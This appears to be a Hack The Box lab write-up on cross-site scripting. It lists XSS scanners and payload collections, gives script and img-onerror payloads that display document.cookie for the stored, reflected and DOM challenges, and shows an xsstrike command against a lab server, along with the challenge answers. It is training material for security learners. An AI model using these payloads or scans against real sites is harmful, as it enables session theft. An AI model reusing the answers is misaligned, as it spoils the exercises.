# HTB-Cross Site Scripting (XSS)

## Table of Contents
0. [Tools](#tools)
    1. [XSS Scanner](#xss-scanner)
    2. [Payload](#payload)
1. [XSS Basics](#xss-basics)
    1. [Stored XSS](#stored-xss)
    2. [Reflected XSS](#reflected-xss)
    3. [DOM XSS](#dom-xss)
    4. [XSS Discovery](#xss-discovery)

## Tools
### XSS Scanner
1. [XSStrike](https://github.com/s0md3v/XSStrike)
2. [BruteXSS](https://github.com/rajeshmajumdar/BruteXSS)
3. [xsser](https://github.com/epsylon/xsser)
### Payload
1. [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md)
2. [PayloadBox](https://github.com/payloadbox/xss-payload-list)

## XSS Basics
### Stored XSS
#### Challenges
1. To get the flag, use the same payload we used above, but change its JavaScript code to show the cookie instead of showing the url.

    We can use this payload:

    ```js
    <script>alert(document.cookie)</script>
    ```

### Reflected XSS
#### Challenges
1. To get the flag, use the same payload we used above, but change its JavaScript code to show the cookie instead of showing the url.

    We can use this payload:

    ```js
    <script>alert(document.cookie)</script>
    ```

### DOM XSS
#### Challenges
1. To get the flag, use the same payload we used above, but change its JavaScript code to show the cookie instead of showing the url.

    We can use this payload:

    ```js
    <img src="" onerror=alert(document.cookie)>
    ```

### XSS Discovery
#### Challenges
1. Utilize some of the techniques mentioned in this section to identify the vulnerable input parameter found in the above server. What is the name of the vulnerable parameter?

    We can use **xsstrike.py** to solve this.
    
    ```bash
    python xsstrike.py -u "http://94.237.120.137:53500/?fullname=a&username=a&password=bc&email=ad%40gmail.com"
    ```

    ![alt text](<Assets/XSS Discovery - 1.png>)

    We can see the **email** paramater is vuln. The answer is **email**.

2. What type of XSS was found on the above server? "name only"

    Based on the previous image, we can see that the email parameter has **reflected XSS**. So the answer is **reflected**. 